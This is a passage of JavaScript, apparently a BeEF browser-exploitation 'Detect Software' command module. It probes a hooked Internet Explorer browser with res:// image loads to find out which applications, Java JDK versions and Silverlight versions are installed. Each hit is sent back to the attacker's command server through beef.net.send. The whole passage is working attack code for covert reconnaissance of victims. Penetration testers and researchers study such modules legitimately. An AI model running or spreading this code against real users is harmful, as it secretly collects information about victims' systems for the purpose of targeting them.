    ['PGP Desktop', 'PGP Corporation\\PGP Desktop\\PGPdesk.exe/#2/#600'],
    ['Google Toolbar', 'Google\\googleToolbar1.dll/#2/#120'],
    ['Flash MX 2004', 'Macromedia\\Flash MX 2004\\flash.exe/#2/#4395'],
    ['MSN Messenger', 'Messenger\\msmsgs.exe/#2/#607'],
    ['Microsoft Live Meeting 7', 'Microsoft Office\\live meeting 7\\console\\7.5.2302.14\\pwresources_zh_tt.dll/#2/#9006'],
    ['Microsoft Excel 2003', 'Microsoft Office\\Office11\\excel.exe/#34/#904'],
    ['Microsoft Office 2003', 'Microsoft Office\\Office11\\1033\\MSOhelp.exe/#2/201'],
    ['Microsoft Visual Studio 8', 'Microsoft Visual Studio 8\\common7\\ide\\devenv.exe/#2/#6606'],
    ['Microsoft Movie Maker', 'Movie Maker\\moviemk.exe/RT_JPG/sample1'],
    ['Picasa2', 'picasa2\\picasa2.exe/#2/#138'],
    ['Quicktime', 'quicktime\\quicktimeplayer.exe/#2/#403'],
    ['Real VNC4', 'RealVNC\\VNC4\\vncviewer.exe/#2/#120'],
    ['OLE View', 'Resource Kit\\oleview.exe/#2/#2'],
    ['Secure CRT', 'SecureCRT\\SecureCRT.exe/#2/#224'],
    ['Symantec Antivirus', 'symantec_client_security\\symantec antivirus\\vpc32.exe/#2/#157'],
    ['Ultramon', 'ultramon\\ultramondesktop.exe/#2/#108'],
    ['VMware Workstation', 'vmware\\vmware workstation\\vmware.exe/#2/#508'],
    ['Winamp', 'winamp\\winamp.exe/#2/#109'],
    ['Windows Media Player', 'Windows Media Player\\wmsetsdk.exe/#2/#249']
  ];

  beef.debug("[Detect Software] Enumerating installed software...");
  for (var dir=0;dir<program_dirs.length; dir++) {
    for (var i=0; i<software.length; i++) {
      var img    = new Image;
      img.title  = software[i][0];
      img.src    = "res://" + drive + ":\\" + program_dirs[dir] + "\\" + software[i][1];
      img.onload = function() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_software=" + this.title); dom.removeChild(this); }
      img.onerror= function() { dom.removeChild(this); }
      dom.appendChild(img);
    }
  }

  // Enumerate Java JDK installs
  beef.debug("[Detect Software] Enumerating JDK installs...");
  var java_versions = ['1.8.0', '1.7.0', '1.6.0'];
  for (var dir=0;dir<program_dirs.length; dir++) {
    for (var v=0; v<java_versions.length; v++) {
      for (var patch_level=0; patch_level<100; patch_level++) {
        var pad = '';
        if (patch_level < 10) pad = '0';
        var img    = new Image;
        img.title  = "Java JDK" + java_versions[v] + "_" + pad + patch_level;
        img.src    = "res://" + drive + ":\\" + program_dirs[dir] + "\\Java\\jdk" + java_versions[v] + "_" + pad + patch_level + "\\jre\\bin\\awt.dll/2/CHECK_BITMAP";
        img.onload = function() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_software=" + this.title); dom.removeChild(this); }
        img.onerror= function() { dom.removeChild(this); }
        dom.appendChild(img);
      }
    }
  }

  // Enumerate Silverlight installs
  beef.debug("[Detect Software] Enumerating Silverlight installs...");
  var silverlight_versions = [
    '5.1.50901.0',
    '5.1.50709.0',
    '5.1.50428.0',
    '5.1.41212.0',
    '5.1.41105.0',
    '5.1.40728.0',
    '5.1.40416.0',
    '5.1.31211.0',
    '5.1.30514.0',
    '5.1.30214.0',
    '5.1.20913.0',
    '5.1.20513.0',
    '5.1.20125.0',
    '5.1.10411.0',
    '5.0.61118.0',
    '5.0.60818.0',
    '5.0.60401.0',
    '4.1.10329.0',
    '4.1.10111.0',
    '4.0.60831.0',
    '4.0.60531.0',
    '4.0.60310.0',
    '4.0.60129.0',
    '4.0.51204.0',
    '4.0.50917.0',
    '4.0.50826.0',
    '4.0.50524.00',
    '4.0.50401.00',
    '3.0.50611.0',
    '3.0.50106.00',
    '3.0.40818.00',
    '3.0.40723.00',
    '3.0.40624.00',
    '2.0.40115.00',
    '2.0.31005.00',
    '1.0.30715.00',
    '1.0.30401.00',
    '1.0.30109.00',
    '1.0.21115.00',
    '1.0.20816.00'
  ];

  for (var dir=0;dir<program_dirs.length; dir++) {
    for (var i=0; i<silverlight_versions.length; i++) {
      var img    = new Image;
      img.title  = silverlight_versions[i];
      img.src    = "res://" + drive + ":\\" + program_dirs[dir] + "\\Microsoft Silverlight\\" + silverlight_versions[i] + "\\npctrl.dll/2/102";
      img.onload = function() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_software=Microsoft Silverlight v" + this.title); dom.removeChild(this); }
      img.onerror= function() { dom.removeChild(this); }
      dom.appendChild(img);
    }
  }
});

